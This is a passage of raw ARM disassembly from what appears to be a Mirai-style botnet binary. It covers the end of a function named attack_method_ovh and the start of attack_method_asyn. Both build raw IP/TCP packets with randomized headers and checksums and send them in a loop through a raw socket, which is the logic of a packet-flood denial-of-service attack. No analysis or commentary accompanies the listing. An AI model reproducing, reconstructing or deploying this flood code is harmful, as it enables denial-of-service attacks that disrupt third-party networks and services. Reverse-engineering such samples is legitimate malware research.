    ab1c:	e3a02019 	mov	r2, #25
    ab20:	e1a00004 	mov	r0, r4
    ab24:	ebfffe62 	bl	a4b4 <attack_get_opt_ip>
    ab28:	e3a01003 	mov	r1, #3
    ab2c:	e58d0060 	str	r0, [sp, #96]	; 0x60
    ab30:	e3a02006 	mov	r2, #6
    ab34:	e3a00002 	mov	r0, #2
    ab38:	eb003879 	bl	18d24 <__GI_socket>
    ab3c:	e3700001 	cmn	r0, #1
    ab40:	e1a0a000 	mov	sl, r0
    ab44:	0a000131 	beq	b010 <attack_method_ovh+0x69c>
    ab48:	e28d3070 	add	r3, sp, #112	; 0x70
    ab4c:	e3a02001 	mov	r2, #1
    ab50:	e5232004 	str	r2, [r3, #-4]!
    ab54:	e3a0c004 	mov	ip, #4
    ab58:	e3a01000 	mov	r1, #0
    ab5c:	e2822002 	add	r2, r2, #2
    ab60:	e58dc000 	str	ip, [sp]
    ab64:	eb00385c 	bl	18cdc <__GI_setsockopt>
    ab68:	e3700001 	cmn	r0, #1
    ab6c:	0a000125 	beq	b008 <attack_method_ovh+0x694>
    ab70:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
    ab74:	e3a02000 	mov	r2, #0
    ab78:	e1a00801 	lsl	r0, r1, #16
    ab7c:	e1a0480b 	lsl	r4, fp, #16
    ab80:	e1a05806 	lsl	r5, r6, #16
    ab84:	e58d206c 	str	r2, [sp, #108]	; 0x6c
    ab88:	e59d2030 	ldr	r2, [sp, #48]	; 0x30
    ab8c:	e1a03820 	lsr	r3, r0, #16
    ab90:	e1a06824 	lsr	r6, r4, #16
    ab94:	e1a01825 	lsr	r1, r5, #16
    ab98:	e3570000 	cmp	r7, #0
    ab9c:	e58d304c 	str	r3, [sp, #76]	; 0x4c
    aba0:	e58d6058 	str	r6, [sp, #88]	; 0x58
    aba4:	e58d105c 	str	r1, [sp, #92]	; 0x5c
    aba8:	e202b0ff 	and	fp, r2, #255	; 0xff
    abac:	0a000092 	beq	adfc <attack_method_ovh+0x488>
    abb0:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    abb4:	e1a0e803 	lsl	lr, r3, #16
    abb8:	e1a03c06 	lsl	r3, r6, #24
    abbc:	e59d604c 	ldr	r6, [sp, #76]	; 0x4c
    abc0:	e1a02c01 	lsl	r2, r1, #24
    abc4:	e1a0140e 	lsl	r1, lr, #8
    abc8:	e1a01821 	lsr	r1, r1, #16
    abcc:	e1a00c20 	lsr	r0, r0, #24
    abd0:	e206c0ff 	and	ip, r6, #255	; 0xff
    abd4:	e181ec2e 	orr	lr, r1, lr, lsr #24
    abd8:	e180c40c 	orr	ip, r0, ip, lsl #8
    abdc:	e28d0030 	add	r0, sp, #48	; 0x30
    abe0:	e8900003 	ldm	r0, {r0, r1}
    abe4:	e1a03823 	lsr	r3, r3, #16
    abe8:	e1a02822 	lsr	r2, r2, #16
    abec:	e2000001 	and	r0, r0, #1
    abf0:	e2011001 	and	r1, r1, #1
    abf4:	e1836c24 	orr	r6, r3, r4, lsr #24
    abf8:	e1825c25 	orr	r5, r2, r5, lsr #24
    abfc:	e58d000c 	str	r0, [sp, #12]
    ac00:	e58d1010 	str	r1, [sp, #16]
    ac04:	e28d2038 	add	r2, sp, #56	; 0x38
    ac08:	e892000c 	ldm	r2, {r2, r3}
    ac0c:	e28d0040 	add	r0, sp, #64	; 0x40
    ac10:	e8900003 	ldm	r0, {r0, r1}
    ac14:	e2022001 	and	r2, r2, #1
    ac18:	e2033001 	and	r3, r3, #1
    ac1c:	e2000001 	and	r0, r0, #1
    ac20:	e2011001 	and	r1, r1, #1
    ac24:	e58de064 	str	lr, [sp, #100]	; 0x64
    ac28:	e58dc008 	str	ip, [sp, #8]
    ac2c:	e58d2014 	str	r2, [sp, #20]
    ac30:	e58d3018 	str	r3, [sp, #24]
    ac34:	e58d001c 	str	r0, [sp, #28]
    ac38:	e58d1020 	str	r1, [sp, #32]
    ac3c:	e3a04000 	mov	r4, #0
    ac40:	e3a01001 	mov	r1, #1
    ac44:	e3a00080 	mov	r0, #128	; 0x80
    ac48:	eb003b17 	bl	198ac <calloc>
    ac4c:	e59d206c 	ldr	r2, [sp, #108]	; 0x6c
    ac50:	e7890104 	str	r0, [r9, r4, lsl #2]
    ac54:	e1a03282 	lsl	r3, r2, #5
    ac58:	e7994102 	ldr	r4, [r9, r2, lsl #2]
    ac5c:	e0433182 	sub	r3, r3, r2, lsl #3
    ac60:	e0830008 	add	r0, r3, r8
    ac64:	e5d43000 	ldrb	r3, [r4]
    ac68:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    ac6c:	e3833040 	orr	r3, r3, #64	; 0x40
    ac70:	e5c43000 	strb	r3, [r4]
    ac74:	e5d42000 	ldrb	r2, [r4]
    ac78:	e3c2200a 	bic	r2, r2, #10
    ac7c:	e3822005 	orr	r2, r2, #5
    ac80:	e59d3054 	ldr	r3, [sp, #84]	; 0x54
    ac84:	e5c42000 	strb	r2, [r4]
    ac88:	e59d1048 	ldr	r1, [sp, #72]	; 0x48
    ac8c:	e5c41001 	strb	r1, [r4, #1]
    ac90:	e59d2050 	ldr	r2, [sp, #80]	; 0x50
    ac94:	e3530000 	cmp	r3, #0
    ac98:	e3a03b0f 	mov	r3, #15360	; 0x3c00
    ac9c:	e5c42008 	strb	r2, [r4, #8]
    aca0:	e1c430b2 	strh	r3, [r4, #2]
    aca4:	e3a03006 	mov	r3, #6
    aca8:	e59d1008 	ldr	r1, [sp, #8]
    acac:	13a02040 	movne	r2, #64	; 0x40
    acb0:	e5c43009 	strb	r3, [r4, #9]
    acb4:	11c420b6 	strhne	r2, [r4, #6]
    acb8:	e59d2060 	ldr	r2, [sp, #96]	; 0x60
    acbc:	e584200c 	str	r2, [r4, #12]
    acc0:	e5903010 	ldr	r3, [r0, #16]
    acc4:	e1c410b4 	strh	r1, [r4, #4]
    acc8:	e5843010 	str	r3, [r4, #16]
    accc:	e1c461b4 	strh	r6, [r4, #20]
    acd0:	e2841014 	add	r1, r4, #20
    acd4:	e5d1300c 	ldrb	r3, [r1, #12]
    acd8:	e5d1200d 	ldrb	r2, [r1, #13]
    acdc:	e59d000c 	ldr	r0, [sp, #12]
    ace0:	e3c33050 	bic	r3, r3, #80	; 0x50
    ace4:	e38330a0 	orr	r3, r3, #160	; 0xa0
    ace8:	e3c22020 	bic	r2, r2, #32
    acec:	e5c1300c 	strb	r3, [r1, #12]
    acf0:	e1822280 	orr	r2, r2, r0, lsl #5
    acf4:	e59d3064 	ldr	r3, [sp, #100]	; 0x64
    acf8:	e5c1200d 	strb	r2, [r1, #13]
    acfc:	e5813004 	str	r3, [r1, #4]
    ad00:	e5d1300d 	ldrb	r3, [r1, #13]
    ad04:	e59d0010 	ldr	r0, [sp, #16]
    ad08:	e3c33010 	bic	r3, r3, #16
    ad0c:	e1833200 	orr	r3, r3, r0, lsl #4
    ad10:	e5c1300d 	strb	r3, [r1, #13]
    ad14:	e5d1200d 	ldrb	r2, [r1, #13]
    ad18:	e59d3014 	ldr	r3, [sp, #20]
    ad1c:	e3c22008 	bic	r2, r2, #8
    ad20:	e1822183 	orr	r2, r2, r3, lsl #3
    ad24:	e1c150b2 	strh	r5, [r1, #2]
    ad28:	e5c1200d 	strb	r2, [r1, #13]
    ad2c:	e5d1300d 	ldrb	r3, [r1, #13]
    ad30:	e59d0018 	ldr	r0, [sp, #24]
    ad34:	e3c33004 	bic	r3, r3, #4
    ad38:	e1833100 	orr	r3, r3, r0, lsl #2
    ad3c:	e5c1300d 	strb	r3, [r1, #13]
    ad40:	e5d1200d 	ldrb	r2, [r1, #13]
    ad44:	e59d301c 	ldr	r3, [sp, #28]
    ad48:	e3c22002 	bic	r2, r2, #2
    ad4c:	e1822083 	orr	r2, r2, r3, lsl #1
    ad50:	e5c1200d 	strb	r2, [r1, #13]
    ad54:	e5d1300d 	ldrb	r3, [r1, #13]
    ad58:	e59d0020 	ldr	r0, [sp, #32]
    ad5c:	e3c33001 	bic	r3, r3, #1
    ad60:	e1803003 	orr	r3, r0, r3
    ad64:	e5c1300d 	strb	r3, [r1, #13]
    ad68:	e3a02004 	mov	r2, #4
    ad6c:	e3a01002 	mov	r1, #2
    ad70:	e5c41028 	strb	r1, [r4, #40]	; 0x28
    ad74:	e5c42029 	strb	r2, [r4, #41]	; 0x29
    ad78:	eb001da8 	bl	12420 <rand_next>
    ad7c:	e200000f 	and	r0, r0, #15
    ad80:	e2800e57 	add	r0, r0, #1392	; 0x570
    ad84:	e2800008 	add	r0, r0, #8
    ad88:	e1a00800 	lsl	r0, r0, #16
    ad8c:	e1a03420 	lsr	r3, r0, #8
    ad90:	e2033cff 	and	r3, r3, #65280	; 0xff00
    ad94:	e1833c20 	orr	r3, r3, r0, lsr #24
    ad98:	e1c432ba 	strh	r3, [r4, #42]	; 0x2a
    ad9c:	e3a03004 	mov	r3, #4
    ada0:	e5c4302c 	strb	r3, [r4, #44]	; 0x2c
    ada4:	e3a0200a 	mov	r2, #10
    ada8:	e3a03008 	mov	r3, #8
    adac:	e3a00002 	mov	r0, #2
    adb0:	e5c4302e 	strb	r3, [r4, #46]	; 0x2e
    adb4:	e5c4202f 	strb	r2, [r4, #47]	; 0x2f
    adb8:	e5c4002d 	strb	r0, [r4, #45]	; 0x2d
    adbc:	eb001d97 	bl	12420 <rand_next>
    adc0:	e3a02006 	mov	r2, #6
    adc4:	e5c4203b 	strb	r2, [r4, #59]	; 0x3b
    adc8:	e3a01003 	mov	r1, #3
    adcc:	e3a03000 	mov	r3, #0
    add0:	e3a02001 	mov	r2, #1
    add4:	e5840030 	str	r0, [r4, #48]	; 0x30
    add8:	e5843034 	str	r3, [r4, #52]	; 0x34
    addc:	e5c42038 	strb	r2, [r4, #56]	; 0x38
    ade0:	e5c4103a 	strb	r1, [r4, #58]	; 0x3a
    ade4:	e5c41039 	strb	r1, [r4, #57]	; 0x39
    ade8:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    adec:	e0834002 	add	r4, r3, r2
    adf0:	e1540007 	cmp	r4, r7
    adf4:	e58d406c 	str	r4, [sp, #108]	; 0x6c
    adf8:	baffff90 	blt	ac40 <attack_method_ovh+0x2cc>
    adfc:	e3a03000 	mov	r3, #0
    ae00:	e3570000 	cmp	r7, #0
    ae04:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    ae08:	0afffffb 	beq	adfc <attack_method_ovh+0x488>
    ae0c:	e1a00003 	mov	r0, r3
    ae10:	e1a03280 	lsl	r3, r0, #5
    ae14:	e0433180 	sub	r3, r3, r0, lsl #3
    ae18:	e0833008 	add	r3, r3, r8
    ae1c:	e5d32014 	ldrb	r2, [r3, #20]
    ae20:	e7995100 	ldr	r5, [r9, r0, lsl #2]
    ae24:	e352001f 	cmp	r2, #31
    ae28:	e2856014 	add	r6, r5, #20
    ae2c:	9a00003b 	bls	af20 <attack_method_ovh+0x5ac>
    ae30:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    ae34:	e3730001 	cmn	r3, #1
    ae38:	0a000050 	beq	af80 <attack_method_ovh+0x60c>
    ae3c:	e3a04801 	mov	r4, #65536	; 0x10000
    ae40:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    ae44:	e2444001 	sub	r4, r4, #1
    ae48:	e1500004 	cmp	r0, r4
    ae4c:	0a000052 	beq	af9c <attack_method_ovh+0x628>
    ae50:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    ae54:	e1510004 	cmp	r1, r4
    ae58:	0a000054 	beq	afb0 <attack_method_ovh+0x63c>
    ae5c:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    ae60:	e1520004 	cmp	r2, r4
    ae64:	0a000056 	beq	afc4 <attack_method_ovh+0x650>
    ae68:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    ae6c:	e1530004 	cmp	r3, r4
    ae70:	0a000058 	beq	afd8 <attack_method_ovh+0x664>
    ae74:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    ae78:	e1500004 	cmp	r0, r4
    ae7c:	0a00005a 	beq	afec <attack_method_ovh+0x678>
    ae80:	e35b0000 	cmp	fp, #0
    ae84:	1a00005c 	bne	affc <attack_method_ovh+0x688>
    ae88:	e3a01000 	mov	r1, #0
    ae8c:	e1c510ba 	strh	r1, [r5, #10]
    ae90:	e1a00005 	mov	r0, r5
    ae94:	e3a01014 	mov	r1, #20
    ae98:	eb000e47 	bl	e7bc <checksum_generic>
    ae9c:	e3a02000 	mov	r2, #0
    aea0:	e1c500ba 	strh	r0, [r5, #10]
    aea4:	e1a01006 	mov	r1, r6
    aea8:	e1c621b0 	strh	r2, [r6, #16]
    aeac:	e3a03028 	mov	r3, #40	; 0x28
    aeb0:	e3a02b0a 	mov	r2, #10240	; 0x2800
    aeb4:	e1a00005 	mov	r0, r5
    aeb8:	eb000e53 	bl	e80c <checksum_tcpudp>
    aebc:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    aec0:	e1a0e283 	lsl	lr, r3, #5
    aec4:	e1c601b0 	strh	r0, [r6, #16]
    aec8:	e04ee183 	sub	lr, lr, r3, lsl #3
    aecc:	e1d660b2 	ldrh	r6, [r6, #2]
    aed0:	e08ee008 	add	lr, lr, r8
    aed4:	e1ce60b2 	strh	r6, [lr, #2]
    aed8:	e3a03901 	mov	r3, #16384	; 0x4000
    aedc:	e3a0c010 	mov	ip, #16
    aee0:	e1a01005 	mov	r1, r5
    aee4:	e1a0000a 	mov	r0, sl
    aee8:	e3a0203c 	mov	r2, #60	; 0x3c
    aeec:	e58de000 	str	lr, [sp]
    aef0:	e58dc004 	str	ip, [sp, #4]
    aef4:	eb003756 	bl	18c54 <__libc_sendto>
    aef8:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    aefc:	e2830001 	add	r0, r3, #1
    af00:	e1500007 	cmp	r0, r7
    af04:	e58d006c 	str	r0, [sp, #108]	; 0x6c
    af08:	baffffc0 	blt	ae10 <attack_method_ovh+0x49c>
    af0c:	e3a03000 	mov	r3, #0
    af10:	e3570000 	cmp	r7, #0
    af14:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    af18:	0affffb7 	beq	adfc <attack_method_ovh+0x488>
    af1c:	eaffffba 	b	ae0c <attack_method_ovh+0x498>
    af20:	e5934010 	ldr	r4, [r3, #16]
    af24:	eb001d3d 	bl	12420 <rand_next>
    af28:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    af2c:	e1a01283 	lsl	r1, r3, #5
    af30:	e0411183 	sub	r1, r1, r3, lsl #3
    af34:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    af38:	e1a02c24 	lsr	r2, r4, #24
    af3c:	e182242c 	orr	r2, r2, ip, lsr #8
    af40:	e0811008 	add	r1, r1, r8
    af44:	e2043cff 	and	r3, r4, #65280	; 0xff00
    af48:	e5d1c014 	ldrb	ip, [r1, #20]
    af4c:	e1822403 	orr	r2, r2, r3, lsl #8
    af50:	e1822c04 	orr	r2, r2, r4, lsl #24
    af54:	e0822c30 	add	r2, r2, r0, lsr ip
    af58:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    af5c:	e1a03c22 	lsr	r3, r2, #24
    af60:	e1833420 	orr	r3, r3, r0, lsr #8
    af64:	e2021cff 	and	r1, r2, #65280	; 0xff00
    af68:	e1833401 	orr	r3, r3, r1, lsl #8
    af6c:	e1833c02 	orr	r3, r3, r2, lsl #24
    af70:	e5853010 	str	r3, [r5, #16]
    af74:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    af78:	e3730001 	cmn	r3, #1
    af7c:	1affffae 	bne	ae3c <attack_method_ovh+0x4c8>
    af80:	eb001d26 	bl	12420 <rand_next>
    af84:	e3a04801 	mov	r4, #65536	; 0x10000
    af88:	e585000c 	str	r0, [r5, #12]
    af8c:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    af90:	e2444001 	sub	r4, r4, #1
    af94:	e1500004 	cmp	r0, r4
    af98:	1affffac 	bne	ae50 <attack_method_ovh+0x4dc>
    af9c:	eb001d1f 	bl	12420 <rand_next>
    afa0:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    afa4:	e1510004 	cmp	r1, r4
    afa8:	e1c500b4 	strh	r0, [r5, #4]
    afac:	1affffaa 	bne	ae5c <attack_method_ovh+0x4e8>
    afb0:	eb001d1a 	bl	12420 <rand_next>
    afb4:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    afb8:	e1520004 	cmp	r2, r4
    afbc:	e1c501b4 	strh	r0, [r5, #20]
    afc0:	1affffa8 	bne	ae68 <attack_method_ovh+0x4f4>
    afc4:	eb001d15 	bl	12420 <rand_next>
    afc8:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    afcc:	e1530004 	cmp	r3, r4
    afd0:	e1c600b2 	strh	r0, [r6, #2]
    afd4:	1affffa6 	bne	ae74 <attack_method_ovh+0x500>
    afd8:	eb001d10 	bl	12420 <rand_next>
    afdc:	e5860004 	str	r0, [r6, #4]
    afe0:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    afe4:	e1500004 	cmp	r0, r4
    afe8:	1affffa4 	bne	ae80 <attack_method_ovh+0x50c>
    afec:	eb001d0b 	bl	12420 <rand_next>
    aff0:	e35b0000 	cmp	fp, #0
    aff4:	e5860008 	str	r0, [r6, #8]
    aff8:	0affffa2 	beq	ae88 <attack_method_ovh+0x514>
    affc:	eb001d07 	bl	12420 <rand_next>
    b000:	e1c601b2 	strh	r0, [r6, #18]
    b004:	eaffff9f 	b	ae88 <attack_method_ovh+0x514>
    b008:	e1a0000a 	mov	r0, sl
    b00c:	eb004137 	bl	1b4f0 <__GI___libc_close>
    b010:	e28dd074 	add	sp, sp, #116	; 0x74
    b014:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    b018:	e12fff1e 	bx	lr
    b01c:	0002c58c 	andeq	ip, r2, ip, lsl #11

0000b020 <attack_method_asyn>:
    b020:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    b024:	e1a08001 	mov	r8, r1
    b028:	e24dd074 	sub	sp, sp, #116	; 0x74
    b02c:	e3a01004 	mov	r1, #4
    b030:	e1a04002 	mov	r4, r2
    b034:	e1a05003 	mov	r5, r3
    b038:	e1a07000 	mov	r7, r0
    b03c:	eb003a1a 	bl	198ac <calloc>
    b040:	e1a01005 	mov	r1, r5
    b044:	e3a02002 	mov	r2, #2
    b048:	e3a03000 	mov	r3, #0
    b04c:	e1a09000 	mov	r9, r0
    b050:	e1a00004 	mov	r0, r4
    b054:	ebfffd31 	bl	a520 <attack_get_opt_int>
    b058:	e3a03801 	mov	r3, #65536	; 0x10000
    b05c:	e1a0c000 	mov	ip, r0
    b060:	e20cc0ff 	and	ip, ip, #255	; 0xff
    b064:	e2433001 	sub	r3, r3, #1
    b068:	e3a02003 	mov	r2, #3
    b06c:	e1a01005 	mov	r1, r5
    b070:	e1a00004 	mov	r0, r4
    b074:	e58dc048 	str	ip, [sp, #72]	; 0x48
    b078:	ebfffd28 	bl	a520 <attack_get_opt_int>
    b07c:	e1a01005 	mov	r1, r5
    b080:	e58d0024 	str	r0, [sp, #36]	; 0x24
    b084:	e3a02004 	mov	r2, #4
    b088:	e3a03040 	mov	r3, #64	; 0x40
    b08c:	e1a00004 	mov	r0, r4
    b090:	ebfffd22 	bl	a520 <attack_get_opt_int>
    b094:	e1a0c000 	mov	ip, r0
    b098:	e20cc0ff 	and	ip, ip, #255	; 0xff
    b09c:	e1a01005 	mov	r1, r5
    b0a0:	e3a02005 	mov	r2, #5
    b0a4:	e3a03001 	mov	r3, #1
    b0a8:	e1a00004 	mov	r0, r4
    b0ac:	e58dc050 	str	ip, [sp, #80]	; 0x50
    b0b0:	ebfffd1a 	bl	a520 <attack_get_opt_int>
    b0b4:	e3a03801 	mov	r3, #65536	; 0x10000
    b0b8:	e1a0c000 	mov	ip, r0
    b0bc:	e20cc0ff 	and	ip, ip, #255	; 0xff
    b0c0:	e2433001 	sub	r3, r3, #1
    b0c4:	e3a02006 	mov	r2, #6
    b0c8:	e1a01005 	mov	r1, r5
    b0cc:	e1a00004 	mov	r0, r4
    b0d0:	e58dc054 	str	ip, [sp, #84]	; 0x54
    b0d4:	ebfffd11 	bl	a520 <attack_get_opt_int>
    b0d8:	e3a03801 	mov	r3, #65536	; 0x10000
    b0dc:	e1a01005 	mov	r1, r5
    b0e0:	e2433001 	sub	r3, r3, #1
    b0e4:	e3a02007 	mov	r2, #7
    b0e8:	e1a0b000 	mov	fp, r0
    b0ec:	e1a00004 	mov	r0, r4
    b0f0:	ebfffd0a 	bl	a520 <attack_get_opt_int>
    b0f4:	e3a03801 	mov	r3, #65536	; 0x10000
    b0f8:	e1a01005 	mov	r1, r5
    b0fc:	e2433001 	sub	r3, r3, #1
    b100:	e3a02011 	mov	r2, #17
    b104:	e1a06000 	mov	r6, r0
    b108:	e1a00004 	mov	r0, r4
    b10c:	ebfffd03 	bl	a520 <attack_get_opt_int>
    b110:	e1a01005 	mov	r1, r5
    b114:	e58d0028 	str	r0, [sp, #40]	; 0x28
    b118:	e3a02012 	mov	r2, #18
    b11c:	e3a03000 	mov	r3, #0
    b120:	e1a00004 	mov	r0, r4
    b124:	ebfffcfd 	bl	a520 <attack_get_opt_int>
    b128:	e1a01005 	mov	r1, r5
    b12c:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    b130:	e3a0200b 	mov	r2, #11
    b134:	e3a03000 	mov	r3, #0
    b138:	e1a00004 	mov	r0, r4
    b13c:	ebfffcf7 	bl	a520 <attack_get_opt_int>
    b140:	e1a01005 	mov	r1, r5
    b144:	e58d0030 	str	r0, [sp, #48]	; 0x30
    b148:	e3a0200c 	mov	r2, #12
    b14c:	e3a03001 	mov	r3, #1
    b150:	e1a00004 	mov	r0, r4
    b154:	ebfffcf1 	bl	a520 <attack_get_opt_int>
    b158:	e1a01005 	mov	r1, r5
    b15c:	e58d0034 	str	r0, [sp, #52]	; 0x34
    b160:	e3a0200d 	mov	r2, #13
    b164:	e3a03000 	mov	r3, #0
    b168:	e1a00004 	mov	r0, r4
    b16c:	ebfffceb 	bl	a520 <attack_get_opt_int>
    b170:	e1a01005 	mov	r1, r5
    b174:	e58d0038 	str	r0, [sp, #56]	; 0x38
    b178:	e3a0200e 	mov	r2, #14
    b17c:	e3a03000 	mov	r3, #0
    b180:	e1a00004 	mov	r0, r4
    b184:	ebfffce5 	bl	a520 <attack_get_opt_int>
    b188:	e1a01005 	mov	r1, r5
    b18c:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    b190:	e3a0200f 	mov	r2, #15
    b194:	e3a03001 	mov	r3, #1
    b198:	e1a00004 	mov	r0, r4
    b19c:	ebfffcdf 	bl	a520 <attack_get_opt_int>
    b1a0:	e1a01005 	mov	r1, r5
    b1a4:	e58d0040 	str	r0, [sp, #64]	; 0x40
    b1a8:	e3a02010 	mov	r2, #16
    b1ac:	e3a03000 	mov	r3, #0
    b1b0:	e1a00004 	mov	r0, r4
    b1b4:	ebfffcd9 	bl	a520 <attack_get_opt_int>
    b1b8:	e59f2508 	ldr	r2, [pc, #1288]	; b6c8 <attack_method_asyn+0x6a8>
    b1bc:	e58d0044 	str	r0, [sp, #68]	; 0x44
    b1c0:	e5923000 	ldr	r3, [r2]
    b1c4:	e1a01005 	mov	r1, r5
    b1c8:	e3a02019 	mov	r2, #25
    b1cc:	e1a00004 	mov	r0, r4
    b1d0:	ebfffcb7 	bl	a4b4 <attack_get_opt_ip>
    b1d4:	e3a01003 	mov	r1, #3
    b1d8:	e58d0060 	str	r0, [sp, #96]	; 0x60
    b1dc:	e3a02006 	mov	r2, #6
    b1e0:	e3a00002 	mov	r0, #2
    b1e4:	eb0036ce 	bl	18d24 <__GI_socket>
    b1e8:	e3700001 	cmn	r0, #1
    b1ec:	e1a0a000 	mov	sl, r0
    b1f0:	0a000131 	beq	b6bc <attack_method_asyn+0x69c>
    b1f4:	e28d3070 	add	r3, sp, #112	; 0x70
    b1f8:	e3a02001 	mov	r2, #1
    b1fc:	e5232004 	str	r2, [r3, #-4]!
    b200:	e3a0c004 	mov	ip, #4
    b204:	e3a01000 	mov	r1, #0
    b208:	e2822002 	add	r2, r2, #2
    b20c:	e58dc000 	str	ip, [sp]
    b210:	eb0036b1 	bl	18cdc <__GI_setsockopt>
    b214:	e3700001 	cmn	r0, #1
    b218:	0a000125 	beq	b6b4 <attack_method_asyn+0x694>
    b21c:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
    b220:	e3a02000 	mov	r2, #0
    b224:	e1a00801 	lsl	r0, r1, #16
    b228:	e1a0480b 	lsl	r4, fp, #16
    b22c:	e1a05806 	lsl	r5, r6, #16
    b230:	e58d206c 	str	r2, [sp, #108]	; 0x6c
    b234:	e59d2030 	ldr	r2, [sp, #48]	; 0x30
    b238:	e1a03820 	lsr	r3, r0, #16
    b23c:	e1a06824 	lsr	r6, r4, #16
    b240:	e1a01825 	lsr	r1, r5, #16
    b244:	e3570000 	cmp	r7, #0
    b248:	e58d304c 	str	r3, [sp, #76]	; 0x4c
    b24c:	e58d6058 	str	r6, [sp, #88]	; 0x58
    b250:	e58d105c 	str	r1, [sp, #92]	; 0x5c
    b254:	e202b0ff 	and	fp, r2, #255	; 0xff
    b258:	0a000092 	beq	b4a8 <attack_method_asyn+0x488>
    b25c:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    b260:	e1a0e803 	lsl	lr, r3, #16
    b264:	e1a03c06 	lsl	r3, r6, #24
    b268:	e59d604c 	ldr	r6, [sp, #76]	; 0x4c
    b26c:	e1a02c01 	lsl	r2, r1, #24
    b270:	e1a0140e 	lsl	r1, lr, #8
    b274:	e1a01821 	lsr	r1, r1, #16
    b278:	e1a00c20 	lsr	r0, r0, #24
    b27c:	e206c0ff 	and	ip, r6, #255	; 0xff
    b280:	e181ec2e 	orr	lr, r1, lr, lsr #24
    b284:	e180c40c 	orr	ip, r0, ip, lsl #8
    b288:	e28d0030 	add	r0, sp, #48	; 0x30
    b28c:	e8900003 	ldm	r0, {r0, r1}
    b290:	e1a03823 	lsr	r3, r3, #16
    b294:	e1a02822 	lsr	r2, r2, #16
    b298:	e2000001 	and	r0, r0, #1
    b29c:	e2011001 	and	r1, r1, #1
    b2a0:	e1836c24 	orr	r6, r3, r4, lsr #24
    b2a4:	e1825c25 	orr	r5, r2, r5, lsr #24
    b2a8:	e58d000c 	str	r0, [sp, #12]
    b2ac:	e58d1010 	str	r1, [sp, #16]
    b2b0:	e28d2038 	add	r2, sp, #56	; 0x38
    b2b4:	e892000c 	ldm	r2, {r2, r3}
    b2b8:	e28d0040 	add	r0, sp, #64	; 0x40
    b2bc:	e8900003 	ldm	r0, {r0, r1}
    b2c0:	e2022001 	and	r2, r2, #1
    b2c4:	e2033001 	and	r3, r3, #1
    b2c8:	e2000001 	and	r0, r0, #1
    b2cc:	e2011001 	and	r1, r1, #1
    b2d0:	e58de064 	str	lr, [sp, #100]	; 0x64
    b2d4:	e58dc008 	str	ip, [sp, #8]
    b2d8:	e58d2014 	str	r2, [sp, #20]
    b2dc:	e58d3018 	str	r3, [sp, #24]
    b2e0:	e58d001c 	str	r0, [sp, #28]
    b2e4:	e58d1020 	str	r1, [sp, #32]
    b2e8:	e3a04000 	mov	r4, #0
    b2ec:	e3a01001 	mov	r1, #1
    b2f0:	e3a00080 	mov	r0, #128	; 0x80
    b2f4:	eb00396c 	bl	198ac <calloc>
    b2f8:	e59d206c 	ldr	r2, [sp, #108]	; 0x6c
    b2fc:	e7890104 	str	r0, [r9, r4, lsl #2]
    b300:	e1a03282 	lsl	r3, r2, #5
    b304:	e7994102 	ldr	r4, [r9, r2, lsl #2]
    b308:	e0433182 	sub	r3, r3, r2, lsl #3
    b30c:	e0830008 	add	r0, r3, r8
    b310:	e5d43000 	ldrb	r3, [r4]
    b314:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    b318:	e3833040 	orr	r3, r3, #64	; 0x40
    b31c:	e5c43000 	strb	r3, [r4]
    b320:	e5d42000 	ldrb	r2, [r4]
    b324:	e3c2200a 	bic	r2, r2, #10
    b328:	e3822005 	orr	r2, r2, #5
    b32c:	e59d3054 	ldr	r3, [sp, #84]	; 0x54
    b330:	e5c42000 	strb	r2, [r4]
    b334:	e59d1048 	ldr	r1, [sp, #72]	; 0x48
    b338:	e5c41001 	strb	r1, [r4, #1]
    b33c:	e59d2050 	ldr	r2, [sp, #80]	; 0x50
    b340:	e3530000 	cmp	r3, #0
    b344:	e3a03b0f 	mov	r3, #15360	; 0x3c00
    b348:	e5c42008 	strb	r2, [r4, #8]
    b34c:	e1c430b2 	strh	r3, [r4, #2]
    b350:	e3a03006 	mov	r3, #6
    b354:	e59d1008 	ldr	r1, [sp, #8]
    b358:	13a02040 	movne	r2, #64	; 0x40
    b35c:	e5c43009 	strb	r3, [r4, #9]
    b360:	11c420b6 	strhne	r2, [r4, #6]
    b364:	e59d2060 	ldr	r2, [sp, #96]	; 0x60
    b368:	e584200c 	str	r2, [r4, #12]
    b36c:	e5903010 	ldr	r3, [r0, #16]
    b370:	e1c410b4 	strh	r1, [r4, #4]
    b374:	e5843010 	str	r3, [r4, #16]
    b378:	e1c461b4 	strh	r6, [r4, #20]
    b37c:	e2841014 	add	r1, r4, #20
    b380:	e5d1300c 	ldrb	r3, [r1, #12]
    b384:	e5d1200d 	ldrb	r2, [r1, #13]
    b388:	e59d000c 	ldr	r0, [sp, #12]
    b38c:	e3c33050 	bic	r3, r3, #80	; 0x50
    b390:	e38330a0 	orr	r3, r3, #160	; 0xa0
    b394:	e3c22020 	bic	r2, r2, #32
    b398:	e5c1300c 	strb	r3, [r1, #12]
